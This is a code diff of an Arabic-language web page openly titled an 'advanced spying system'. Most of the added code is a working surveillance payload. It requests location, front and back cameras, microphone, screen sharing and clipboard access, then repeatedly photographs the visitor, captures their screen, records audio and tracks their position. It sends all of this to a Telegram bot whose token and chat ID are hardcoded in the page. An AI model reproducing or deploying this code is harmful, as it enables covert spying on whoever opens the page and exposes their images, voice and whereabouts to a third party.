@@ -503,187 +503,596 @@ padding:30px;
             }
         }
     </style>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التجسس المتقدم - تصوير تلقائي مستمر</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: white;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        h1 {
+            text-align: center;
+            color: #00ff88;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            border-bottom: 3px solid #00ff88;
+            padding-bottom: 15px;
+            text-shadow: 0 0 30px rgba(0,255,136,0.3);
+        }
+        
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .status-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: all 0.3s;
+        }
+        
+        .status-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,255,136,0.15);
+        }
+        
+        .status-card .icon {
+            font-size: 2.5em;
+            margin-bottom: 5px;
+        }
+        
+        .status-card .label {
+            font-size: 0.8em;
+            color: #aaa;
+        }
+        
+        .status-card .value {
+            font-size: 1.1em;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        
+        .status-card .value.success {
+            color: #00ff88;
+        }
+        
+        .status-card .value.error {
+            color: #ff4757;
+        }
+        
+        .status-card .value.waiting {
+            color: #ffa502;
+        }
+        
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            color: #0a0a0a;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 25px rgba(0,255,136,0.4);
+        }
+        
+        .btn.danger {
+            background: linear-gradient(135deg, #ff4757, #ff6b81);
+            color: white;
+        }
+        
+        .btn.danger:hover {
+            box-shadow: 0 5px 25px rgba(255,71,87,0.4);
+        }
+        
+        .btn.warning {
+            background: linear-gradient(135deg, #ffa502, #ff6348);
+            color: white;
+        }
+        
+        .btn.warning:hover {
+            box-shadow: 0 5px 25px rgba(255,165,2,0.4);
+        }
+        
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 800px;
+            margin: 20px auto;
+            border-radius: 15px;
+            overflow: hidden;
+            background: #000;
+            border: 2px solid rgba(0,255,136,0.2);
+        }
+        
+        #video {
+            width: 100%;
+            display: none;
+        }
+        
+        #video.active {
+            display: block;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .section {
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-right: 4px solid #00ff88;
+        }
+        
+        .section-title {
+            color: #00ff88;
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 10px;
+        }
+        
+        .info-item {
+            background: rgba(255,255,255,0.03);
+            padding: 10px 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.03);
+        }
+        
+        .info-label {
+            font-weight: bold;
+            color: #888;
+            font-size: 0.8em;
+            text-transform: uppercase;
+        }
+        
+        .info-value {
+            color: white;
+            font-size: 0.95em;
+            margin-top: 3px;
+            word-break: break-all;
+        }
+        
+        .info-value.highlight {
+            color: #00ff88;
+            font-weight: bold;
+        }
+        
+        #map {
+            width: 100%;
+            height: 350px;
+            border-radius: 15px;
+            margin-top: 10px;
+            border: 2px solid rgba(0,255,136,0.2);
+        }
+        
+        .log-container {
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85em;
+            border: 1px solid rgba(0,255,136,0.1);
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: #aaa;
+        }
+        
+        .log-entry .time {
+            color: #00ff88;
+        }
+        
+        .log-entry .success {
+            color: #00ff88;
+        }
+        
+        .log-entry .error {
+            color: #ff4757;
+        }
+        
+        .log-entry .info {
+            color: #ffa502;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ff88;
+            border-radius: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            .controls {
+                flex-direction: column;
+                align-items: center;
+            }
+            .btn {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h1>🕵️ نظام جمع المعلومات المتقدم</h1>
+        <h1>🕵️ نظام التجسس المتقدم</h1>
         
         <!-- حالة الصلاحيات -->
         <div class="status-grid" id="statusGrid">
             <div class="status-card">
                 <div class="icon">📍</div>
-                <div class="label">الموقع الجغرافي</div>
-                <div class="value" id="gpsStatus">جاري...</div>
+                <div class="label">الموقع (GPS)</div>
+                <div class="value waiting" id="gpsStatus">⏳ في الانتظار</div>
             </div>
             <div class="status-card">
                 <div class="icon">📷</div>
-                <div class="label">الكاميرا</div>
-                <div class="value" id="cameraStatus">جاري...</div>
+                <div class="label">الكاميرا الأمامية</div>
+                <div class="value waiting" id="frontCamStatus">⏳ في الانتظار</div>
+            </div>
+            <div class="status-card">
+                <div class="icon">📷</div>
+                <div class="label">الكاميرا الخلفية</div>
+                <div class="value waiting" id="backCamStatus">⏳ في الانتظار</div>
             </div>
             <div class="status-card">
                 <div class="icon">🎤</div>
                 <div class="label">الميكروفون</div>
-                <div class="value" id="micStatus">جاري...</div>
+                <div class="value waiting" id="micStatus">⏳ في الانتظار</div>
             </div>
             <div class="status-card">
-                <div class="icon">🔊</div>
-                <div class="label">السماعات</div>
-                <div class="value" id="speakerStatus">جاري...</div>
+                <div class="icon">🖥️</div>
+                <div class="label">مشاركة الشاشة</div>
+                <div class="value waiting" id="screenStatus">⏳ في الانتظار</div>
+            </div>
+            <div class="status-card">
+                <div class="icon">🔔</div>
+                <div class="label">الإشعارات</div>
+                <div class="value waiting" id="notifStatus">⏳ في الانتظار</div>
             </div>
         </div>
         
         <!-- أزرار التحكم -->
-        <div style="text-align: center; margin: 20px 0;">
-            <button class="button" onclick="requestPermissions()">🔓 طلب جميع الصلاحيات</button>
-            <button class="button danger" onclick="capturePhoto()">📸 تصوير فوري</button>
-            <button class="button" onclick="startRecording()">🎙️ تسجيل صوت</button>
-            <button class="button" onclick="getLocation()">📍 تحديث الموقع</button>
-            <button class="button" onclick="sendAllData()">📤 إرسال كل البيانات</button>
+        <div class="controls">
+            <button class="btn" onclick="requestAllPermissions()">🔓 طلب كل الصلاحيات</button>
+            <button class="btn warning" onclick="capturePhoto('front')">📸 تصوير أمامي</button>
+            <button class="btn warning" onclick="capturePhoto('back')">📸 تصوير خلفي</button>
+            <button class="btn danger" onclick="captureScreen()">🖥️ تصوير الشاشة</button>
+            <button class="btn" onclick="startRecording()">🎙️ تسجيل صوت</button>
+            <button class="btn" onclick="sendAllData()">📤 إرسال كل البيانات</button>
         </div>
         
-        <!-- الفيديو -->
+        <!-- عرض الفيديو -->
         <div class="video-container">
             <video id="video" autoplay playsinline></video>
             <canvas id="canvas"></canvas>
         </div>
         
-        <div id="loading" class="loading">
-            <div class="spinner"></div>
-            <p>جاري جمع كل المعلومات عن جهازك...</p>
+        <!-- الخريطة -->
+        <div id="map"></div>
+        
+        <!-- سجل العمليات -->
+        <div class="section">
+            <div class="section-title">📋 سجل العمليات</div>
+            <div class="log-container" id="logContainer">
+                <div class="log-entry">⏳ جاري تشغيل النظام...</div>
+            </div>
         </div>
         
-        <div id="content"></div>
+        <!-- معلومات إضافية -->
+        <div id="extraInfo"></div>
     </div>
 
     <script>
         // ============================================================
-        // المتغيرات العامة
+        // 1. المتغيرات العامة
         // ============================================================
         const BOT_TOKEN = '8529112495:AAFYQ5_9K8WeaA0k1qtrYAWyb75ajTaJ7RQ';
         const CHAT_ID = '1485247348';
+        
         let currentStream = null;
+        let frontStream = null;
+        let backStream = null;
+        let screenStream = null;
         let mediaRecorder = null;
         let audioChunks = [];
         let allData = {};
-        let locationWatchId = null;
         let lastLocation = null;
+        let locationWatchId = null;
+        let captureInterval = null;
+        let screenCaptureInterval = null;
+        let isFrontCamera = true;
         let cameraActive = false;
         let micActive = false;
         let screenActive = false;
+        let permissionsGranted = false;
+        let logCount = 0;
 
         // ============================================================
-        // 1. طلب جميع الصلاحيات
+        // 2. دوال التسجيل والتصوير
         // ============================================================
-        async function requestPermissions() {
-            const statuses = {
-                gps: document.getElementById('gpsStatus'),
-                camera: document.getElementById('cameraStatus'),
-                mic: document.getElementById('micStatus'),
-                speaker: document.getElementById('speakerStatus')
-            };
+        function addLog(message, type = 'info') {
+            const container = document.getElementById('logContainer');
+            const time = new Date().toLocaleTimeString('ar-EG');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${message}</span>`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
+            logCount++;
+            
+            // حفظ في localStorage للرجوع لها
+            try {
+                const logs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
+                logs.push({ time, message, type });
+                if (logs.length > 100) logs.shift();
+                localStorage.setItem('spy_logs', JSON.stringify(logs));
+            } catch(e) {}
+        }
 
-            // طلب الموقع
+        // ============================================================
+        // 3. طلب كل الصلاحيات
+        // ============================================================
+        async function requestAllPermissions() {
+            addLog('🚀 بدء طلب جميع الصلاحيات...', 'info');
+            
+            // 1. الموقع الجغرافي
+            await requestGeolocation();
+            
+            // 2. الكاميرا (الأمامية والخلفية)
+            await requestCameras();
+            
+            // 3. الميكروفون
+            await requestMicrophone();
+            
+            // 4. مشاركة الشاشة
+            await requestScreen();
+            
+            // 5. الإشعارات
+            await requestNotifications();
+            
+            // 6. الصلاحيات الإضافية
+            await requestExtraPermissions();
+            
+            permissionsGranted = true;
+            addLog('✅ تم طلب جميع الصلاحيات بنجاح', 'success');
+            
+            // بدء التصوير التلقائي
+            startAutoCapture();
+        }
+
+        // ============================================================
+        // 4. طلب الموقع الجغرافي
+        // ============================================================
+        async function requestGeolocation() {
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 15000,
                         maximumAge: 0
                     });
                 });
+                
                 lastLocation = {
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
                     accuracy: pos.coords.accuracy,
                     altitude: pos.coords.altitude,
                     speed: pos.coords.speed,
-                    heading: pos.coords.heading
+                    heading: pos.coords.heading,
+                    timestamp: new Date().toISOString()
                 };
-                statuses.gps.textContent = '✅ مصرح';
-                statuses.gps.className = 'value success';
                 
-                // عرض الموقع على الخريطة
+                document.getElementById('gpsStatus').textContent = '✅ مصرح';
+                document.getElementById('gpsStatus').className = 'value success';
+                addLog(`📍 تم الحصول على الموقع: ${lastLocation.lat}, ${lastLocation.lon}`, 'success');
+                
                 showLocationOnMap(lastLocation.lat, lastLocation.lon);
-                
-                // بدء تتبع الموقع
                 startLocationTracking();
+                
+                // إرسال الموقع فوراً
+                sendLocationToTelegram();
+                
             } catch(e) {
-                statuses.gps.textContent = '❌ مرفوض';
-                statuses.gps.className = 'value error';
-                console.log('❌ GPS Error:', e.message);
+                document.getElementById('gpsStatus').textContent = '❌ مرفوض';
+                document.getElementById('gpsStatus').className = 'value error';
+                addLog(`❌ فشل الحصول على الموقع: ${e.message}`, 'error');
             }
+        }
 
-            // طلب الكاميرا والميكروفون
+        // ============================================================
+        // 5. طلب الكاميرات (أمامية وخلفية)
+        // ============================================================
+        async function requestCameras() {
+            // الكاميرا الأمامية
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+                
+                frontStream.getTracks().forEach(track => track.stop());
+                document.getElementById('frontCamStatus').textContent = '✅ مصرح';
+                document.getElementById('frontCamStatus').className = 'value success';
+                addLog('📷 تم الحصول على صلاحية الكاميرا الأمامية', 'success');
+                
+            } catch(e) {
+                document.getElementById('frontCamStatus').textContent = '❌ مرفوض';
+                document.getElementById('frontCamStatus').className = 'value error';
+                addLog(`❌ فشل الكاميرا الأمامية: ${e.message}`, 'error');
+            }
+            
+            // الكاميرا الخلفية
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'environment',
                         width: { ideal: 1920 },
                         height: { ideal: 1080 }
-                    },
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true
                     }
                 });
+                
+                backStream.getTracks().forEach(track => track.stop());
+                document.getElementById('backCamStatus').textContent = '✅ مصرح';
+                document.getElementById('backCamStatus').className = 'value success';
+                addLog('📷 تم الحصول على صلاحية الكاميرا الخلفية', 'success');
+                
+                // تشغيل الكاميرا الافتراضية (الخلفية)
+                await startCamera('environment');
+                
+            } catch(e) {
+                document.getElementById('backCamStatus').textContent = '❌ مرفوض';
+                document.getElementById('backCamStatus').className = 'value error';
+                addLog(`❌ فشل الكاميرا الخلفية: ${e.message}`, 'error');
+                
+                // محاولة تشغيل أي كاميرا متاحة
+                try {
+                    await startCamera('user');
+                } catch(e2) {
+                    addLog(`❌ فشل تشغيل أي كاميرا: ${e2.message}`, 'error');
+                }
+            }
+        }
+
+        // ============================================================
+        // 6. تشغيل الكاميرا
+        // ============================================================
+        async function startCamera(facingMode = 'environment') {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: facingMode,
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
+                    audio: false
+                });
+                
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
                 
                 currentStream = stream;
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 video.classList.add('active');
                 cameraActive = true;
-                micActive = true;
                 
-                statuses.camera.textContent = '✅ مصرح';
-                statuses.camera.className = 'value success';
-                statuses.mic.textContent = '✅ مصرح';
-                statuses.mic.className = 'value success';
+                addLog(`📷 تم تشغيل الكاميرا (${facingMode === 'environment' ? 'خلفية' : 'أمامية'})`, 'success');
                 
-                // طلب السماعات
-                try {
-                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    await audioCtx.resume();
-                    statuses.speaker.textContent = '✅ مصرح';
-                    statuses.speaker.className = 'value success';
-                } catch(e) {
-                    statuses.speaker.textContent = '⚠️ جزئي';
-                    statuses.speaker.className = 'value';
-                }
+                // تصوير فوري بعد التشغيل
+                setTimeout(() => capturePhoto(facingMode), 1000);
                 
-                // تصوير صورة تلقائية
-                setTimeout(() => capturePhoto(), 2000);
-                
+                return true;
             } catch(e) {
-                statuses.camera.textContent = '❌ مرفوض';
-                statuses.camera.className = 'value error';
-                statuses.mic.textContent = '❌ مرفوض';
-                statuses.mic.className = 'value error';
-                console.log('❌ Camera/Mic Error:', e.message);
-            }
-
-            // طلب الإشعارات
-            try {
-                if (Notification.permission === 'default') {
-                    await Notification.requestPermission();
-                }
-            } catch(e) {
-                console.log('Notification Error:', e.message);
-            }
-
-            // طلب الشاشة
-            try {
-                // نطلب الشاشة بشكل منفصل
-                setTimeout(() => requestScreenCapture(), 3000);
-            } catch(e) {
-                console.log('Screen Error:', e.message);
+                addLog(`❌ فشل تشغيل الكاميرا: ${e.message}`, 'error');
+                return false;
             }
         }
 
         // ============================================================
-        // 2. طلب مشاركة الشاشة
+        // 7. طلب الميكروفون
         // ============================================================
-        async function requestScreenCapture() {
+        async function requestMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    },
+                    video: false
+                });
+                
+                stream.getTracks().forEach(track => track.stop());
+                micActive = true;
+                document.getElementById('micStatus').textContent = '✅ مصرح';
+                document.getElementById('micStatus').className = 'value success';
+                addLog('🎤 تم الحصول على صلاحية الميكروفون', 'success');
+                
+            } catch(e) {
+                document.getElementById('micStatus').textContent = '❌ مرفوض';
+                document.getElementById('micStatus').className = 'value error';
+                addLog(`❌ فشل الميكروفون: ${e.message}`, 'error');
+            }
+        }
+
+        // ============================================================
+        // 8. طلب مشاركة الشاشة
+        // ============================================================
+        async function requestScreen() {
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({
                     video: {
@@ -692,27 +1101,316 @@ padding:30px;
                     },
                     audio: true
                 });
-                screenActive = true;
-                console.log('✅ Screen sharing active');
                 
-                // تسجيل الشاشة لمدة 10 ثواني
-                const recorder = new MediaRecorder(stream);
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    await sendVideoToTelegram(blob, 'تسجيل الشاشة');
-                };
-                recorder.start();
-                setTimeout(() => recorder.stop(), 10000);
+                screenStream = stream;
+                screenActive = true;
+                document.getElementById('screenStatus').textContent = '✅ مصرح';
+                document.getElementById('screenStatus').className = 'value success';
+                addLog('🖥️ تم الحصول على صلاحية مشاركة الشاشة', 'success');
+                
+                // بدأ تصوير الشاشة التلقائي
+                startAutoScreenCapture();
                 
             } catch(e) {
-                console.log('❌ Screen capture error:', e.message);
+                document.getElementById('screenStatus').textContent = '❌ مرفوض';
+                document.getElementById('screenStatus').className = 'value error';
+                addLog(`❌ فشل مشاركة الشاشة: ${e.message}`, 'error');
             }
         }
 
         // ============================================================
-        // 3. تتبع الموقع المستمر
+        // 9. طلب الإشعارات
+        // ============================================================
+        async function requestNotifications() {
+            try {
+                if (Notification.permission === 'default') {
+                    const result = await Notification.requestPermission();
+                    if (result === 'granted') {
+                        document.getElementById('notifStatus').textContent = '✅ مصرح';
+                        document.getElementById('notifStatus').className = 'value success';
+                        addLog('🔔 تم الحصول على صلاحية الإشعارات', 'success');
+                    } else {
+                        document.getElementById('notifStatus').textContent = '❌ مرفوض';
+                        document.getElementById('notifStatus').className = 'value error';
+                    }
+                } else {
+                    document.getElementById('notifStatus').textContent = Notification.permission === 'granted' ? '✅ مصرح' : '❌ مرفوض';
+                    document.getElementById('notifStatus').className = Notification.permission === 'granted' ? 'value success' : 'value error';
+                }
+            } catch(e) {
+                document.getElementById('notifStatus').textContent = '❌ خطأ';
+                document.getElementById('notifStatus').className = 'value error';
+                addLog(`❌ فشل الإشعارات: ${e.message}`, 'error');
+            }
+        }
+
+        // ============================================================
+        // 10. طلب صلاحيات إضافية
+        // ============================================================
+        async function requestExtraPermissions() {
+            try {
+                // الحافظة
+                if (navigator.clipboard) {
+                    try {
+                        await navigator.clipboard.readText();
+                        addLog('📋 تم الحصول على صلاحية الحافظة', 'success');
+                    } catch(e) {
+                        addLog(`⚠️ صلاحية الحافظة: ${e.message}`, 'info');
+                    }
+                }
+                
+                // البلوتوث
+                if (navigator.bluetooth) {
+                    addLog('🔵 البلوتوث مدعوم', 'info');
+                }
+                
+                // USB
+                if (navigator.usb) {
+                    addLog('🔌 USB مدعوم', 'info');
+                }
+                
+                // الملفات
+                if (window.showDirectoryPicker) {
+                    addLog('📁 صلاحية الملفات مدعومة', 'info');
+                }
+                
+            } catch(e) {
+                addLog(`⚠️ بعض الصلاحيات الإضافية: ${e.message}`, 'info');
+            }
+        }
+
+        // ============================================================
+        // 11. تصوير الكاميرا (أمامية/خلفية)
+        // ============================================================
+        async function capturePhoto(type = 'environment') {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            if (!video.srcObject) {
+                // محاولة تشغيل الكاميرا
+                await startCamera(type);
+                setTimeout(() => capturePhoto(type), 500);
+                return;
+            }
+            
+            // التأكد من أن الفيديو جاهز
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                setTimeout(() => capturePhoto(type), 500);
+                return;
+            }
+            
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+            const typeName = type === 'environment' ? 'خلفية' : 'أمامية';
+            
+            addLog(`📸 تم تصوير الكاميرا ${typeName}`, 'success');
+            
+            // إرسال الصورة
+            await sendPhotoToTelegram(dataUrl, `📸 كاميرا ${typeName}`);
+            
+            // حفظ الصورة محلياً
+            saveImageLocally(dataUrl, `camera_${type}_${Date.now()}.jpg`);
+        }
+
+        // ============================================================
+        // 12. تصوير الشاشة
+        // ============================================================
+        async function captureScreen() {
+            try {
+                if (!screenActive) {
+                    await requestScreen();
+                    setTimeout(() => captureScreen(), 1000);
+                    return;
+                }
+                
+                const video = document.createElement('video');
+                video.srcObject = screenStream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                addLog('🖥️ تم تصوير الشاشة', 'success');
+                
+                await sendPhotoToTelegram(dataUrl, '🖥️ لقطة شاشة');
+                saveImageLocally(dataUrl, `screen_${Date.now()}.jpg`);
+                
+            } catch(e) {
+                addLog(`❌ فشل تصوير الشاشة: ${e.message}`, 'error');
+            }
+        }
+
+        // ============================================================
+        // 13. التصوير التلقائي المستمر
+        // ============================================================
+        function startAutoCapture() {
+            // تصوير الكاميرا كل 10 ثواني
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            captureInterval = setInterval(async () => {
+                if (cameraActive) {
+                    // تبديل بين الأمامية والخلفية
+                    const type = isFrontCamera ? 'front' : 'environment';
+                    await capturePhoto(type);
+                    isFrontCamera = !isFrontCamera;
+                }
+            }, 10000); // كل 10 ثواني
+            
+            addLog('🔄 بدأ التصوير التلقائي للكاميرا (كل 10 ثواني)', 'success');
+        }
+
+        // ============================================================
+        // 14. تصوير الشاشة التلقائي
+        // ============================================================
+        function startAutoScreenCapture() {
+            if (screenCaptureInterval) {
+                clearInterval(screenCaptureInterval);
+            }
+            
+            screenCaptureInterval = setInterval(async () => {
+                if (screenActive) {
+                    await captureScreen();
+                }
+            }, 30000); // كل 30 ثانية
+            
+            addLog('🔄 بدأ تصوير الشاشة التلقائي (كل 30 ثانية)', 'success');
+        }
+
+        // ============================================================
+        // 15. تسجيل الصوت
+        // ============================================================
+        async function startRecording() {
+            if (!micActive) {
+                await requestMicrophone();
+                setTimeout(() => startRecording(), 1000);
+                return;
+            }
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                audioChunks = [];
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'audio/webm'
+                });
+                
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data.size > 0) {
+                        audioChunks.push(e.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    await sendAudioToTelegram(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                addLog('🎙️ بدأ تسجيل الصوت (10 ثواني)', 'info');
+                
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        addLog('🎙️ انتهى تسجيل الصوت', 'success');
+                    }
+                }, 10000);
+                
+            } catch(e) {
+                addLog(`❌ فشل تسجيل الصوت: ${e.message}`, 'error');
+            }
+        }
+
+        // ============================================================
+        // 16. حفظ الصور محلياً
+        // ============================================================
+        function saveImageLocally(dataUrl, filename) {
+            try {
+                const link = document.createElement('a');
+                link.href = dataUrl;
+                link.download = filename;
+                link.click();
+                addLog(`💾 تم حفظ الصورة: ${filename}`, 'success');
+            } catch(e) {
+                // محاولة حفظ في localStorage
+                try {
+                    const images = JSON.parse(localStorage.getItem('spy_images') || '[]');
+                    images.push({ filename, data: dataUrl, time: Date.now() });
+                    if (images.length > 50) images.shift();
+                    localStorage.setItem('spy_images', JSON.stringify(images));
+                    addLog(`💾 تم حفظ الصورة في localStorage: ${filename}`, 'success');
+                } catch(e2) {
+                    addLog(`❌ فشل حفظ الصورة: ${e2.message}`, 'error');
+                }
+            }
+        }
+
+        // ============================================================
+        // 17. إرسال الصورة إلى تيليجرام
+        // ============================================================
+        async function sendPhotoToTelegram(dataUrl, caption) {
+            try {
+                const blob = await fetch(dataUrl).then(r => r.blob());
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    addLog(`✅ تم إرسال الصورة إلى تيليجرام: ${caption}`, 'success');
+                } else {
+                    addLog(`❌ فشل إرسال الصورة: ${result.description}`, 'error');
+                }
+                return result;
+            } catch(e) {
+                addLog(`❌ فشل إرسال الصورة: ${e.message}`, 'error');
+                return null;
+            }
+        }
+
+        // ============================================================
+        // 18. إرسال الصوت إلى تيليجرام
+        // ============================================================
+        async function sendAudioToTelegram(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', blob, 'audio.webm');
+                formData.append('caption', `🎙️ تسجيل صوت - ${new Date().toLocaleString('ar-EG')}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    addLog('✅ تم إرسال التسجيل الصوتي إلى تيليجرام', 'success');
+                } else {
+                    addLog(`❌ فشل إرسال الصوت: ${result.description}`, 'error');
+                }
+                return result;
+            } catch(e) {
+                addLog(`❌ فشل إرسال الصوت: ${e.message}`, 'error');
+                return null;
+            }
+        }
+
+        // ============================================================
+        // 19. تتبع الموقع المستمر
         // ============================================================
         function startLocationTracking() {
             if (locationWatchId !== null) {
@@ -730,15 +1428,16 @@ padding:30px;
                         heading: pos.coords.heading,
                         timestamp: new Date().toISOString()
                     };
+                    
                     showLocationOnMap(lastLocation.lat, lastLocation.lon);
                     
                     // إرسال تحديث الموقع كل 30 ثانية
-                    if (Math.random() < 0.05) { // 5% احتمال الإرسال
-                        sendLocationUpdate();
+                    if (Math.random() < 0.1) {
+                        sendLocationToTelegram();
                     }
                 },
                 (err) => {
-                    console.log('❌ Location watch error:', err.message);
+                    addLog(`⚠️ خطأ في تتبع الموقع: ${err.message}`, 'error');
                 },
                 {
                     enableHighAccuracy: true,
@@ -746,37 +1445,33 @@ padding:30px;
                     maximumAge: 0
                 }
             );
+            
+            addLog('📍 بدأ تتبع الموقع المستمر', 'success');
         }
 
         // ============================================================
-        // 4. عرض الموقع على الخريطة
+        // 20. عرض الموقع على الخريطة
         // ============================================================
         function showLocationOnMap(lat, lon) {
-            let mapContainer = document.getElementById('map');
-            if (!mapContainer) {
-                mapContainer = document.createElement('div');
-                mapContainer.id = 'map';
-                document.querySelector('.container').appendChild(mapContainer);
-            }
+            const mapContainer = document.getElementById('map');
+            mapContainer.innerHTML = '';
             
-            // استخدام OpenStreetMap
             const iframe = document.createElement('iframe');
             iframe.style.width = '100%';
-            iframe.style.height = '400px';
+            iframe.style.height = '350px';
             iframe.style.border = 'none';
             iframe.style.borderRadius = '15px';
             iframe.src = `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}`;
             
-            mapContainer.innerHTML = '';
             mapContainer.appendChild(iframe);
             
-            // إضافة رابط لفتح الموقع في Google Maps
+            // رابط Google Maps
             const link = document.createElement('div');
             link.style.marginTop = '10px';
             link.style.textAlign = 'center';
             link.innerHTML = `
                 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" 
-                   style="color: #00d4ff; text-decoration: none; font-size: 1.2em;">
+                   style="color: #00ff88; text-decoration: none; font-size: 1.1em;">
                    📍 فتح الموقع في Google Maps
                 </a>
             `;
@@ -784,197 +1479,22 @@ padding:30px;
         }
 
         // ============================================================
-        // 5. تصوير صورة
+        // 21. إرسال الموقع إلى تيليجرام
         // ============================================================
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
